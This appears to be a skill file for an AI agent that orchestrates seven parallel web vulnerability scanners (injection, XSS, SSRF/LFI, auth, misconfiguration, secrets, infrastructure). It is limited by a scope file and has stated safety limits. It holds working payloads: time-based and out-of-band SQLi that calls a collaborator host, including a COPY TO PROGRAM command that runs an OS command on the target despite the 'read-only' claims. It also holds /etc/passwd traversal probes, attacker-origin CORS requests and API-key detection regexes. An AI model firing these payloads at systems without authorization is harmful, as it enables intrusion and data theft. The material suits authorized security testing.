---
name: stress-scan
description: >
  Orchestrates parallel vulnerability scanning across 7 specialized agents,
  consuming the URL pools built by stress-recon. Agent 1: Injection (SQLi, SSTI,
  CRLF). Agent 2: XSS (reflected, stored, DOM). Agent 3: SSRF + LFI + path
  traversal. Agent 4: Auth & access control (IDOR, rate limit, JWT). Agent 5:
  Misconfig (CORS, headers, 403 bypass). Agent 6: Secrets & info disclosure.
  Agent 7: Infrastructure (subdomain takeover, smuggling, cloud). Each agent
  includes built-in verification loops — findings are curl-confirmed before
  reporting. Requires stress-recon output (live_urls.txt, all_endpoints.txt,
  all_urls_final.txt, ranked_urls.txt).
  Use when the user invokes "stress-scan", "full web assessment", "API scan",
  "rate limit test", "IDOR scan", "vulnerability scan", "vuln scan",
  "vulnerability pattern matching", or "web surface scan".
---

# Stress Scan — Parallel Vulnerability Assessment Orchestrator

## Purpose

Scan the full attack surface built by stress-recon using 7 specialized vulnerability
agents running in parallel. Each agent scans one vulnerability class, verifies its
own findings, and outputs a structured findings file.

**This skill requires stress-recon output.** If the URL pool files don't exist, tell
the user to run stress-recon first.

> **Key rule**: Steps marked **"always run"** use only `curl`/`grep` and must execute
> even when every tool is missing. Steps that require a specific tool print
> `[skip] <tool> — run: bash install.sh` and continue; never skip an entire phase.

Before starting, read **[references/TOOLKIT.md](references/TOOLKIT.md)** and
**[references/advanced-tools.md](references/advanced-tools.md)** for tool flags and chains.

## Scan Progress Checklist

```
- [ ] Phase 0: Load stress-recon output + validate pools
- [ ] Phase 1: Pattern matching (gf + manual grep) → *_candidates.txt
- [ ] Phase 2: Launch 7 parallel vulnerability agents
- [ ]   Agent 1: Injection (SQLi + SSTI + CRLF)
- [ ]   Agent 2: XSS (reflected + stored + DOM)
- [ ]   Agent 3: SSRF + LFI + Path Traversal
- [ ]   Agent 4: Auth & Access Control (IDOR + Rate Limit + JWT)
- [ ]   Agent 5: Misconfig (CORS + Headers + 403 Bypass)
- [ ]   Agent 6: Secrets & Information Disclosure
- [ ]   Agent 7: Infrastructure (Takeover + Smuggling + Cloud)
- [ ] Phase 3: Merge agent findings + deduplicate
- [ ] Phase 4: Generate report + handoff to escalate-scan
```

---

## Phase 0 — Load Recon Output

### 0a — Locate output directory

Find the most recent stress-recon output:
```
OUTDIR=$(ls -td reports/assets/stress_*_* 2>/dev/null | head -1)
```
If no directory found → stop: `"Run stress-recon first to build URL pools."`

### 0b — Validate URL pools exist

Check these files are non-empty:
- `$OUTDIR/recon/live_urls.txt` — live HTTP targets
- `$OUTDIR/recon/all_endpoints.txt` — discovered paths/routes
- `$OUTDIR/crawl/all_urls_final.txt` — full parametrized URL surface

If any are missing or empty → stop with specific error.

### 0c — Load configuration

Read `scope.txt` (project root) for: `TARGET_URL`, `AUTH_HEADER`, `RATE_LIMIT_DELAY`,
`MAX_REQUESTS`, `DALFOX_ENABLED`, tool tuning overrides.

**Read `OUT_OF_SCOPE_VULNS`** from scope.txt. If set, parse the comma-separated list and
**skip all scanning and reporting** for those vulnerability classes. Mapping:
- `brute-force` / `rate-limiting` → skip Agent 4 rate-limit checks
- `cors` → skip Agent 6 CORS checks (corsy, manual CORS probes)
- `clickjacking` → skip X-Frame-Options / clickjacking findings
- `xss` → skip Agent 2 entirely
- `sqli` / `ssti` / `crlf` → skip Agent 1 (or relevant sub-checks)
- `ssrf` / `lfi` → skip Agent 3 (or relevant sub-checks)
- `idor` → skip Agent 4 IDOR checks
- `header-missing` / `version-disclosure` → skip Agent 6 header/version findings
- `subdomain-takeover` → skip Agent 7 takeover checks
- `open-redirect` → skip redirect findings
- Any finding matching an out-of-scope class → do NOT include in output JSON

Source `skills/stress-scan/script/env_setup.sh` for wordlist vars.

Detect WAF status from `$OUTDIR/recon/waf.txt` (if exists):
- WAF detected → `TOOL_RATE=10 TOOL_THREADS=10`
- No WAF → `TOOL_RATE=50 TOOL_THREADS=30`

### 0d — Load target rankings

Read `$OUTDIR/patterns/ranked_urls.txt` if it exists. This tells agents which URLs
to scan first (rank 5 = highest priority).

### 0e — Load hunt memory

Read `memory/patterns.jsonl` if it exists. This contains successful finding patterns
from previous scans, indexed by tech stack. Each line is a JSON object:
```json
{"tech":"rails","vuln_class":"idor","param":"id","path_pattern":"/api/*/show","severity":"High","found_count":3,"last_seen":"2026-04-10"}
{"tech":"express","vuln_class":"xss","param":"callback","path_pattern":"/api/jsonp","severity":"Medium","found_count":5,"last_seen":"2026-04-09"}
```

**How agents use hunt memory:**
1. Read `$OUTDIR/recon/tech_stack.txt` to identify the target's tech stack
2. Filter `patterns.jsonl` for entries matching the detected tech stack
3. For matching patterns:
   - Boost rank of URLs matching `path_pattern` (treat as rank 5 regardless of original rank)
   - Grep `all_urls_final.txt` for the `param` value — test these first
   - If `found_count >= 3`, this pattern is reliable — prioritize heavily
4. Each agent receives the filtered patterns relevant to its vuln class

Start **interactsh-client** → save `$COLLAB_HOST` for OOB blind testing.

Print summary:
```
stress-scan orchestrator loaded:
  Output dir:  $OUTDIR
  Live hosts:  N
  Endpoints:   N
  URLs:        N
  WAF:         yes/no → rate: N req/s
  Hunt memory: N patterns loaded (M matching target tech stack)
```

---

## Phase 1 — Pattern Matching

**Goal**: Pre-filter `all_urls_final.txt` by vulnerability class for the parallel agents.

Run `gf` patterns → `patterns/<class>_candidates.txt`: `sqli · xss · ssrf · lfi · redirect · rce · idor`

**gf fallback** (**always run — no tools needed**): If `gf` is not installed or a pattern
file returns 0 results while input is non-empty, use grep-based fallback:
```
# XSS fallback: URLs with reflected params
grep -iE '[?&](q|search|query|name|value|input|text|msg|message|comment|callback|redirect|url|next|return|error|err|data|content)=' all_urls_final.txt > patterns/xss_candidates.txt

# SQLi fallback: URLs with DB-likely params
grep -iE '[?&](id|user_id|item|cat|category|page|order|sort|column|table|select|where|limit|offset|search)=' all_urls_final.txt > patterns/sqli_candidates.txt

# SSRF fallback: URLs with URL/fetch params
grep -iE '[?&](url|uri|link|src|source|dest|redirect|fetch|proxy|callback|next|return|goto|target|domain|host|site)=' all_urls_final.txt > patterns/ssrf_candidates.txt

# LFI fallback: URLs with file/path params
grep -iE '[?&](file|path|dir|directory|filename|include|page|template|document|folder|root|filepath|load)=' all_urls_final.txt > patterns/lfi_candidates.txt
```
**Auth-path URL generation** (**always run — CRITICAL**):
Many live hosts have no crawled URLs with parameters (they return 302/login pages).
Generate synthetic XSS candidate URLs for ALL live hosts using common auth paths.

**WHY**: Auth callback XSS is one of the most common reflected XSS classes across
all identity providers (Keycloak, Auth0, Okta, Azure AD, Spring Security, CAS, SAML).
These endpoints often require MULTIPLE parameters — a trigger param (e.g., `error=`)
to render the error page, and a reflectable param (e.g., `error_description=`) whose
value appears unescaped in the HTML. Without the trigger, the endpoint returns 302
and no reflection occurs. We must test both single-param and multi-param combinations
across all known callback path patterns and all known identity provider conventions.

```bash
# --- Callback paths across all major identity providers ---
AUTH_PATHS=(
  # Generic OAuth/OIDC
  "/auth/callback" "/oauth/callback" "/login/callback" "/sso/callback"
  "/signin-oidc" "/authorization-code/callback" "/implicit/callback"
  # Keycloak
  "/auth/realms/master/protocol/openid-connect/auth"
  "/auth/realms/master/login-actions/authenticate"
  "/auth/realms/master/clients-registrations/openid-connect"
  # Spring Security
  "/oauth/authorize" "/login/oauth2/code/custom"
  # SAML
  "/saml/acs" "/saml/callback" "/saml2/acs" "/auth/saml/callback"
  # CAS
  "/cas/login"
  # Generic error/login
  "/auth/error" "/auth/login" "/login" "/signin" "/error" "/sso/error"
)

# --- Reflectable parameters by protocol ---
# OAuth/OIDC: error_description, state, redirect_uri, scope, response_type, login_hint
# Spring OAuth: redirect_uri, scope, response_type, client_id (whitelabel error page)
# CAS: service (reflected in login page)
# SAML: RelayState
# Generic: message, msg, detail, info, reason, error_reason, error_code, url, next, return_url
REFLECT_PARAMS=(
  "error_description" "error" "message" "msg" "redirect_uri"
  "return_url" "next" "url" "callback" "state" "login_hint"
  "error_reason" "error_code" "detail" "info" "scope"
  "response_type" "client_id" "service" "RelayState"
)

# --- Trigger parameters (cause error page to render instead of 302) ---
ERROR_TRIGGERS=(
  "error=invalid_request"
  "error=unauthorized"
  "error=access_denied"
  "error=server_error"
  "error=invalid_client"
  "error=invalid_scope"
)

while read -r host; do
  for path in "${AUTH_PATHS[@]}"; do
    # Phase A: single-param probes
    for param in "${REFLECT_PARAMS[@]}"; do
      echo "${host}${path}?${param}=FUZZ"
    done
    # Phase B: multi-param probes (trigger + reflectable param)
    for trigger in "${ERROR_TRIGGERS[@]}"; do
      for param in error_description message msg detail error_reason scope redirect_uri; do
        echo "${host}${path}?${trigger}&${param}=FUZZ"
      done
    done
  done
done < recon/live_urls.txt >> patterns/xss_candidates.txt
sort -u -o patterns/xss_candidates.txt patterns/xss_candidates.txt
```

After gf + fallback, check coverage:
```
TOTAL=$(wc -l < all_urls_final.txt)
COVERED=$(cat patterns/*_candidates.txt 2>/dev/null | sort -u | wc -l)
echo "Pattern coverage: $COVERED / $TOTAL URLs matched ($((COVERED * 100 / TOTAL))%)"
```

**Manual grep** (**always run — no tools needed**) on `all_urls_final.txt`:
- PII: `customer_id= customer_phone= phone_number= email= user_id= national_id=` → `patterns/pii_in_urls.txt`
- Financial: `payment_id= transaction_id= amount= card_number= repayment_id=` → `patterns/financial_in_urls.txt`
- File ops: `file= path= dir= filename= include= page=` → merge into `lfi_candidates.txt`

Non-empty `pii_in_urls.txt` or `financial_in_urls.txt` = immediate finding (indexed by Wayback, appears in CDN logs).

### 1b — Uncovered URL tracking

Identify URLs that NO pattern matched — these are "gap URLs" that no agent will test:
```
cat patterns/*_candidates.txt | sort -u > all_covered.txt
comm -23 <(sort all_urls_final.txt) all_covered.txt > patterns/uncovered_urls.txt
echo "[!] $(wc -l < patterns/uncovered_urls.txt) URLs not covered by any pattern"
```
Rank-5 URLs in `uncovered_urls.txt` = critical gap. These MUST be distributed to agents.

---

## Phase 2 — Parallel Vulnerability Agents

**Goal**: Launch 7 agents in parallel, each scanning one vulnerability class.

Use the **Agent tool** to launch all 7 agents simultaneously in a single message.
Each agent receives the same base context (OUTDIR, scope, rate limits, ranked URLs)
plus its vuln-class-specific inputs and instructions.

**Each agent MUST**:
1. Read `patterns/ranked_urls.txt` and process rank-5 URLs first, then rank-4, etc.
2. Run its assigned tools with `TOOL_RATE` and `TOOL_THREADS` caps
3. **Verify every finding with a real curl probe** before marking it verified.
   Verification means:
   - Actually `curl` the URL and capture the response body + headers
   - Store the raw output in `verification_output` (first 500 chars)
   - **Check for authentication barriers**: if the response contains login forms,
     PIN prompts, password fields, OAuth redirects, or 401/403 with auth challenge
     (`WWW-Authenticate`, `<input type="password">`, `enter.*pin`, `enter.*code`),
     then the finding is **NOT verified** — mark `verified: false`,
     `verification_note: "requires authentication (PIN/password/login detected)"`
   - A finding is only `verified: true` if the vulnerability is **actually exploitable
     without credentials** (or with the AUTH_HEADER from scope.txt)
   - **NEVER mark verified based on status code alone** — a 200 with a login page is NOT verified
4. **Classify evidence type** — every finding MUST have `evidence_type`:
   - `"exploitation"` — actual HTTP response proves the vuln (curl returned exploitable output)
   - `"code_analysis"` — found vulnerable pattern in JS/source code but NOT triggered via HTTP
   - `"inferred"` — assumed based on technology version or configuration (e.g., "jQuery 1.x has CVEs")
   **Rules**:
   - Only `"exploitation"` findings can be `verified: true`
   - `"code_analysis"` findings are always `verified: false` — they need manual testing
   - `"inferred"` findings are always `verified: false` and capped at Medium severity
5. **Secondary input**: In addition to its `*_candidates.txt`, each agent also receives:
   - `live_urls.txt` — for host-level checks (e.g., nuclei runs on all live hosts)
   - Rank-5 entries from `patterns/uncovered_urls.txt` — URLs that no pattern matched
     but have high bug potential. Each agent should test these with its tools.
   This ensures NO high-value URL goes untested just because `gf` didn't match it.
5. Write output to `$OUTDIR/agents/<agent_name>_findings.json`
6. Respect `MAX_REQUESTS` — track request count across all tool invocations
7. **Self-Reflection Loop (MANDATORY before writing output)**:
   Before writing `*_findings.json`, review EVERY finding you're about to report
   and apply this self-critique:
   - For each finding, ask: **"Why might this be a false positive?"**
   - Construct the strongest argument you can against the finding being real
   - Then check: does your `verification_output` **definitively refute** that argument?
   - If your false-positive argument is plausible AND the evidence doesn't clearly
     disprove it → **drop the finding** or **downgrade severity by one level**
   - If `verification_output` is empty or generic → drop the finding
   - If the finding references a URL/path you never actually requested → drop it

   **Common self-reflection catches** (drop these automatically):
   - "Reflected XSS" but canary only appears in JSON or HTTP header, not HTML body
   - "SQL injection" but response diff is <5% and no SQL error string present
   - "Missing header" on an API endpoint returning JSON (not frameable/injectable)
   - "Exposed secret" that matches a test/example/documentation pattern
   - "Rate limit bypass" but only 1 request was sent (need 3+ rapid probes)
   - Any finding where the response contained a login form / PIN prompt / auth wall
   - Any finding with status 200 but response body says "unauthorized" or "forbidden"

   This step costs zero HTTP requests — it's pure self-review of evidence you
   already collected. It dramatically reduces false positives at source.

### Agent Output Format

Each agent writes a JSON file with this structure:
```json
{
  "agent": "<agent_name>",
  "scan_class": "<vuln_class>",
  "target": "$TARGET_URL",
  "timestamp": "YYYYMMDD_HHMMSS",
  "findings": [
    {
      "id": "<AGENT_PREFIX>-001",
      "title": "...",
      "severity": "Critical|High|Medium|Low|Info",
      "affected_url": "...",
      "evidence": "...",
      "verified": true,
      "evidence_type": "exploitation | code_analysis | inferred",
      "verification_method": "curl re-check | interactsh callback | response diff",
      "verification_output": "<REQUIRED — first 500 chars of actual curl response proving the vuln>",
      "verification_note": "<if verified:false, explain why — e.g., 'requires PIN', 'login redirect'>",
      "auth_barrier_detected": false,
    }
  ],
  "stats": {
    "urls_scanned": 0,
    "requests_made": 0,
    "findings_total": 0,
    "findings_verified": 0
  }
}
```

---

### Agent 1 — Injection (SQLi + SSTI + CRLF)

**Finding prefix**: `INJ`
**Input files**: `patterns/sqli_candidates.txt`, `recon/all_endpoints.txt`
**Priority**: rank-5 URLs first from `ranked_urls.txt`

**Tools & procedures**:
- `timeout 3m` **sqlmap** on top 20 `sqli_candidates.txt` (rank-5 first):
  `--batch --level 2 --risk 1 --technique=BT --dbs --time-sec 5 --timeout 30` — identification only, no exploitation
- `timeout 3m` **tplmap** on endpoints with template-like params (`template= page= view= render=`)
- `timeout 5m` **crlfuzz** on `live_urls.txt` → CRLF injection across all live hosts
- `timeout 10m` **nuclei** `-tags sqli,ssti,crlf -timeout 10` on `sqli_candidates.txt`

**Verification loop**:
For each finding:
1. Send a baseline request: `curl -s "<url_without_payload>"` → save response length
2. Send the SQLi/SSTI payload request: `curl -s "<url_with_payload>"` → save response
3. **Verified** if: response length differs by >10%, OR response contains SQL error string
   (`syntax error`, `mysql`, `postgresql`, `ORA-`, `ODBC`), OR SSTI output differs from
   template literal (e.g., `49` instead of `7*7`)

**Safety**: sqlmap identification mode only — never `--dump`, `--os-shell`, or `--file-read`

#### Agent 1 — Blind SQLi Testing (Time-Based)

**Always run** for the first 20 URLs in `$OUTDIR/patterns/sqli_candidates.txt`:

```bash
while IFS= read -r url; do
  # Baseline response time (3 measurements, take median)
  TIMES=()
  for t in 1 2 3; do
    T=$(curl -sk -o /dev/null -w "%{time_total}" --max-time 15 "$url" 2>/dev/null)
    TIMES+=("$T")
  done
  BASELINE=$(printf '%s\n' "${TIMES[@]}" | sort -n | sed -n '2p')

  DETECTED=false
  for PAYLOAD in \
    "1 AND SLEEP(5)--" \
    "1'; WAITFOR DELAY '0:0:5'--" \
    "1 AND pg_sleep(5)--" \
    "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
  do
    ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
    TEST_URL=$(echo "$url" | sed "s/=[^&]*/=$ENC/")
    TEST_TIMES=()
    for t in 1 2 3; do
      T=$(curl -sk -o /dev/null -w "%{time_total}" --max-time 20 "$TEST_URL" 2>/dev/null)
      TEST_TIMES+=("$T")
    done
    MEDIAN=$(printf '%s\n' "${TEST_TIMES[@]}" | sort -n | sed -n '2p')
    DELTA=$(python3 -c "d=float('$MEDIAN')-float('$BASELINE'); print(f'{d:.2f}')")
    IS_DELAYED=$(python3 -c "print('yes' if float('$DELTA') >= 4.0 else 'no')")

    if [[ "$IS_DELAYED" == "yes" ]]; then
      echo "[blind-sqli] Confirmed time-based injection on $url"
      echo "[blind-sqli] Baseline: ${BASELINE}s  Test: ${MEDIAN}s  Delta: +${DELTA}s"
      echo "[blind-sqli] Payload: $PAYLOAD"
      echo "$url|$PAYLOAD|$DELTA" >> "$OUTDIR/blind_sqli_confirmed.txt"
      DETECTED=true
      break
    fi
  done
  [[ "$DETECTED" == "false" ]] && echo "[blind-sqli] No time-based injection: $url"
done < <(head -20 "$OUTDIR/patterns/sqli_candidates.txt" 2>/dev/null)
```

**Verified only if**: delta ≥ 4.0 seconds on median of 3 requests.
The 4-second threshold is 20% below the 5-second sleep to absorb network jitter.

#### Agent 1 — OOB (DNS) Blind SQLi (run if $COLLAB_HOST is set OR Burp is enabled)

The OOB collaborator can come from two sources, in order of preference:

1. **Burp Collaborator (preferred when `BURP_ENABLED=1`).** Generated per-payload
   via `mcp__burp__generate_collaborator_payload`. Polled via
   `mcp__burp__get_collaborator_interactions` after the flood. More reliable
   than self-hosted interactsh, no DNS-server-on-the-internet requirement.

2. **interactsh-client (fallback).** Started by stress-recon Phase 0,
   `$COLLAB_HOST` set in env. Used when Burp is not enabled.

```bash
# Determine collaborator source
if [[ "${BURP_ENABLED:-0}" == "1" ]]; then
  OOB_SOURCE="burp"
  # Per-payload: COLLAB_HOST=$(mcp__burp__generate_collaborator_payload)
  echo "[oob-sqli] Using Burp Collaborator (preferred, more reliable)"
elif [[ -n "${COLLAB_HOST:-}" ]]; then
  OOB_SOURCE="interactsh"
  echo "[oob-sqli] Using interactsh-client at $COLLAB_HOST"
else
  OOB_SOURCE=""
  echo "[blind-sqli] OOB testing skipped — set BURP_ENABLED=1 or COLLAB_HOST=your.interactsh.com in scope.txt"
fi

if [[ -n "$OOB_SOURCE" ]]; then
  # When OOB_SOURCE=burp, replace ${COLLAB_HOST} below with a per-iteration
  # call to mcp__burp__generate_collaborator_payload before each payload.
  OOB_PAYLOADS=(
    "1 AND LOAD_FILE('\\\\\\\\${COLLAB_HOST}\\\\a')--"
    "1; EXEC master..xp_dirtree '\\\\${COLLAB_HOST}\\a'--"
    "1; COPY (SELECT '') TO PROGRAM 'nslookup ${COLLAB_HOST}'--"
    "1 UNION SELECT UTL_HTTP.REQUEST('http://${COLLAB_HOST}/')FROM dual--"
  )
  while IFS= read -r url; do
    for PAYLOAD in "${OOB_PAYLOADS[@]}"; do
      ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
      # When OOB_SOURCE=burp, prefer mcp__burp__send_http1_request here so
      # the request flows through Burp's proxy and the passive scanner gets a free pass.
      curl -sk --max-time 10 "$(echo "$url" | sed "s/=[^&]*/=$ENC/")" > /dev/null 2>&1
    done
  done < <(head -20 "$OUTDIR/patterns/sqli_candidates.txt" 2>/dev/null)
  sleep 30  # wait for callbacks

  if [[ "$OOB_SOURCE" == "burp" ]]; then
    # Poll Burp Collaborator for DNS/HTTP callbacks matching the payloads.
    # Pseudocode: mcp__burp__get_collaborator_interactions for each payload.
    OOB_HITS=$(echo "$BURP_INTERACTION_COUNT")  # set by the agent after MCP poll
  else
    OOB_HITS=$(grep -c "${COLLAB_HOST:-NOCOLLAB}" "$OUTDIR/interactsh_log.txt" 2>/dev/null || echo 0)
  fi
  echo "[oob-sqli] Callbacks received via $OOB_SOURCE: $OOB_HITS"
  [[ "$OOB_HITS" -gt 0 ]] && echo "[FINDING] OOB SQLi confirmed — DNS/HTTP exfiltration via $OOB_SOURCE" \
    >> "$OUTDIR/blind_sqli_confirmed.txt"
fi
```

#### Agent 1 — sqlmap Blind Mode (if installed)

```bash
if command -v sqlmap &>/dev/null; then
  mkdir -p "$OUTDIR/sqlmap_blind"
  head -10 "$OUTDIR/patterns/sqli_candidates.txt" 2>/dev/null | while IFS= read -r url; do
    timeout "${TOOL_TIMEOUT_EXPLOIT:-300}" sqlmap \
      -u "$url" \
      --technique=T,U \
      --time-sec=5 \
      --level=2 --risk=1 \
      --batch \
      --output-dir="$OUTDIR/sqlmap_blind/" \
      --headers="${AUTH_HEADER:-}" 2>/dev/null \
      | grep -E "injection|parameter|Time-based" \
      | tee -a "$OUTDIR/sqlmap_blind_summary.txt"
  done
else
  echo "[skip] sqlmap not installed for blind testing — run: bash install.sh"
fi
```

#### Agent 1 — Merge Blind SQLi findings into Agent 1 output

```bash
# Add blind SQLi confirmed findings to agent1 findings JSON
if [[ -f "$OUTDIR/blind_sqli_confirmed.txt" ]]; then
  while IFS='|' read -r url payload delta; do
    echo '{"id":"ST-A1-BLIND-'$RANDOM'","title":"Blind SQL Injection (Time-Based)","severity":"Critical","affected_url":"'$url'","evidence":"Time delta '$delta's with payload: '$payload'","verified":true,"evidence_type":"exploitation","vuln_class":"sqli"}' \
      >> "$OUTDIR/agent1_blind_findings.json"
  done < "$OUTDIR/blind_sqli_confirmed.txt"
fi
```

---

### Agent 2 — XSS (Reflected + Stored + DOM)

**Finding prefix**: `XSS`
**Input files**: `patterns/xss_candidates.txt`, `recon/live_urls.txt`
**Priority**: rank-5 URLs first from `ranked_urls.txt`

**Tools & procedures**:
- `timeout 10m` **dalfox** `pipe` on `xss_candidates.txt` (`--skip-bav --only-custom-payload --timeout 10`)
  Only run if `DALFOX_ENABLED=true` in scope.txt
- `timeout 10m` **nuclei** `-tags xss -timeout 10` on `xss_candidates.txt`
- **Manual reflected XSS probe** (**always run — curl only**):
  For top 20 rank-5 XSS candidates:
  ```
  CANARY="hexstrike$(date +%s)"
  curl -sk "$url${CANARY}" | grep -c "$CANARY"
  ```
  If canary reflects → potential reflected XSS (mark unverified, needs context analysis)

- **Blind auth-path XSS probe** (**always run — CRITICAL for coverage**):
  Auth callback XSS is one of the most common reflected XSS classes. Crawlers miss
  these because the host returns 302 redirects. This step probes ALL live hosts using
  the same comprehensive path/param/trigger lists from Phase 1 URL generation.

  **CRITICAL**: You MUST test multi-param combinations. Many auth callback endpoints
  only render error pages when a trigger param like `error=invalid_request` is present.
  Without it, the endpoint returns 302 and no reflection occurs.

  For EVERY host in `live_urls.txt` — use the same AUTH_PATHS, REFLECT_PARAMS, and
  ERROR_TRIGGERS arrays defined in Phase 1 auth-path URL generation:
  ```bash
  CANARY="hexstrike$(date +%s)"
  for host in $(cat live_urls.txt); do
    for path in "${AUTH_PATHS[@]}"; do
      # Phase A: single-param probes
      for param in "${REFLECT_PARAMS[@]}"; do
        RESP=$(curl -sk --max-time 5 "${host}${path}?${param}=${CANARY}" 2>/dev/null)
        if echo "$RESP" | grep -q "$CANARY"; then
          CONTEXT=$(echo "$RESP" | grep "$CANARY" | head -3)
          echo "[XSS-PROBE] Reflection: ${host}${path}?${param}=${CANARY}"
          echo "  Context: $CONTEXT"
        fi
      done
      # Phase B: multi-param probes (trigger + reflectable param)
      for trigger in "${ERROR_TRIGGERS[@]}"; do
        for param in error_description message msg detail error_reason scope redirect_uri; do
          RESP=$(curl -sk --max-time 5 "${host}${path}?${trigger}&${param}=${CANARY}" 2>/dev/null)
          if echo "$RESP" | grep -q "$CANARY"; then
            CONTEXT=$(echo "$RESP" | grep "$CANARY" | head -3)
            echo "[XSS-PROBE] Reflection: ${host}${path}?${trigger}&${param}=${CANARY}"
            echo "  Context: $CONTEXT"
          fi
        done
      done
    done
  done
  ```

  **Rate limit**: Use `--max-time 5` per request. Skip hosts that return 3 consecutive
  connection timeouts.

**Verification loop**:
For each finding from dalfox/nuclei/blind-probe:
1. `curl -sk "<poc_url>"` → save response body
2. `grep -c '<payload_or_canary>' response.html`
3. **Verified** if: payload/canary appears in response body in an executable HTML context
   (inside `<script>`, in an attribute without encoding, in an event handler)
4. Check Content-Type is `text/html` (not JSON/plain text)
5. Check for auth barriers (login form, PIN prompt) before marking verified

**Safety**: `--skip-bav` mode only — no live payload execution in victim browsers

---

### Agent 3 — SSRF + LFI + Path Traversal

**Finding prefix**: `SLF`
**Input files**: `patterns/ssrf_candidates.txt`, `patterns/lfi_candidates.txt`
**Priority**: rank-5 URLs first from `ranked_urls.txt`

**Tools & procedures**:
- `timeout 10m` **nuclei** `-tags ssrf,lfi -timeout 10` on candidate files
- **SSRF with OOB** (**always run**): for each SSRF candidate URL, replace the param value
  with `$COLLAB_HOST`:
  ```
  # e.g., url=https://example.com → url=http://$COLLAB_HOST
  curl -sk "$base_url?$param=http://$COLLAB_HOST"
  ```
  Monitor interactsh for callbacks
- **LFI manual probe** (**always run — curl only**): for top 20 LFI candidates:
  ```
  curl -sk "$url../../../../../../etc/passwd" | grep -c "root:x:"
  curl -sk "$url....//....//....//etc/passwd" | grep -c "root:x:"
  ```
- **Path traversal**: test `../` sequences on file/path/dir params

**Verification loop**:
- SSRF: **Verified** if interactsh receives DNS or HTTP callback with matching identifier
- LFI: **Verified** if response contains known file content (`root:x:`, `[boot loader]`, etc.)
- Path traversal: **Verified** if response contains parent directory content

**Safety**: read-only probes only — no file write, no internal service exploitation

---

### Agent 4 — Auth & Access Control (IDOR + Rate Limit + JWT)

**Finding prefix**: `AUTH`
**Input files**: `patterns/idor_candidates.txt`, `recon/live_urls.txt`
**Priority**: auth endpoints (rank-5) first

**Tools & procedures**:

**Rate limiting** (**always run — curl only**):
For each auth endpoint (`/login /signin /api/*/authenticate`) across `live_urls.txt`:
```
for i in 1 2 3; do
  curl -sI -X POST "$auth_url" -d "user=test&pass=test$(date +%s)"
done
```
Flag if: no `429` status, no `X-RateLimit-*` header, no `Retry-After` header

**Session flags** (**always run — curl only**):
Check `Set-Cookie` headers on auth endpoints:
- Flag missing `HttpOnly`
- Flag missing `Secure`
- Flag `SameSite=None` without `Secure`

**IDOR surface** (**always run**):
- Grep `all_urls_final.txt` for numeric IDs (`[?&]id=\d+`), UUIDs → `idor_candidates.txt`
- Document surface only — **never enumerate other users' data**

**JWT analysis**:
- **jwt_tool** on tokens found in crawled responses/cookies
- Check: `alg:none`, weak HMAC, missing `exp`, PII in payload
- **Never forge or modify tokens**

**Verification loop**:
- Rate limit: **Verified** if 3 rapid probes return no rate-limiting response
- Session flags: **Verified** if `Set-Cookie` header confirms missing flags
- IDOR: marked as `surface_only` — verification requires authorized testing
- JWT: **Verified** if jwt_tool confirms weakness

**Safety**: 3-probe maximum per auth endpoint — no brute-forcing

---

### Agent 5 — Misconfig (CORS + Headers + 403 Bypass)

**Finding prefix**: `CFG`
**Input files**: `recon/all_endpoints.txt`, 403 endpoints from ffuf output
**Priority**: API endpoints (rank-4+) first

**Tools & procedures**:
- `timeout 5m` **corsy** on `all_endpoints.txt` → CORS misconfig scan
- `timeout 5m` **GoBypass403** on all 403 endpoints → bypass technique POCs
- **Manual CORS probe** (**always run — curl only**):
  For each URL in `all_endpoints.txt`:
  ```
  curl -sI -X OPTIONS -H "Origin: https://evil.attacker.com" \
    -H "Access-Control-Request-Method: GET" "$url"
  ```
  Flag: `Access-Control-Allow-Origin: https://evil.attacker.com` AND
  `Access-Control-Allow-Credentials: true`
- **HTTP smuggling**: `timeout 5m` **smuggler** on `$TARGET_URL`
- **Security header check** (**always run — curl only**):
  `curl -sI "$TARGET_URL"` → flag missing:
  `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`,
  `Content-Security-Policy`, `Referrer-Policy`, `Permissions-Policy`

**Verification loop**:
- CORS: `curl -sI -H "Origin: https://evil.attacker.com" "$url"` →
  **Verified** if ACAO echoes attacker origin + credentials=true
- 403 bypass: `curl -s "$bypass_url"` → **Verified** if status 200 and response differs from 403
- Headers: `curl -sI "$url"` → **Verified** if header is confirmed absent

---

### Agent 6 — Secrets & Information Disclosure

**Finding prefix**: `SEC`
**Input files**: `crawl/all_urls_final.txt`, `crawl/jsluice_output.jsonl`
**Priority**: rank-5 URLs first, then all URLs for secret grep

**Tools & procedures**:

**HTML/JS secret scanning** (**always run — curl only**):
Scan rank-5 and rank-4 URLs first (from `ranked_urls.txt`), then remaining up to 500 total:
```
# Sort by rank (highest first), take top 500
sort -rn -k1,1 "$OUTDIR/patterns/ranked_urls.txt" | head -500 | cut -d' ' -f2- | while IFS= read -r url; do
  curl -sk --max-time 5 --connect-timeout 3 "$url" \
    | grep -oE "(NRJS-|AIza|AKIA[0-9A-Z]{16}|sk_live_|pk_live_|xoxb-|xoxp-|DD_API_KEY|ghp_|npm_)[A-Za-z0-9_\-]{8,}" \
    | sed "s|^|$url |" >> "$OUTDIR/cloud/html_secrets.txt"
done
```

**Advanced secret detection**: **trufflehog** on `$OUTDIR/crawl/` directory

**jsluice review**: Parse `crawl/jsluice_output.jsonl` for secrets found during recon

**Error disclosure** (**always run — curl only**):
On `$TARGET_URL` and each API base in `live_urls.txt`:
```
curl -sk "$url/___nonexistent___"
curl -sk "$url/api/user?id=-1"
curl -sk "$url/api/../admin"
```
Flag: stack traces, file paths, DB query fragments, internal hostnames, framework versions

**Verification loop**:
- Secrets: `curl -sk "$url" | grep "$secret_pattern"` →
  **Verified** if secret pattern still present in current response
- Error disclosure: `curl -sk "$error_url"` →
  **Verified** if stack trace / internal info still present

---

### Agent 7 — Infrastructure (Subdomain Takeover + Smuggling + Cloud)

**Finding prefix**: `INF`
**Input files**: `recon/live_urls.txt`, `cloud/exposed_buckets.txt`
**Priority**: dangling CNAME targets first

**Tools & procedures**:
- `timeout 10m` **nuclei** `-tags takeover -timeout 10` on `live_urls.txt` → subdomain takeover candidates
- **DNS CNAME check** (**always run**): for each subdomain in `live_urls.txt`:
  ```
  dig CNAME "$subdomain" +short
  ```
  Flag: CNAME pointing to unclaimed service (GitHub Pages, Heroku, S3, Azure, etc.)
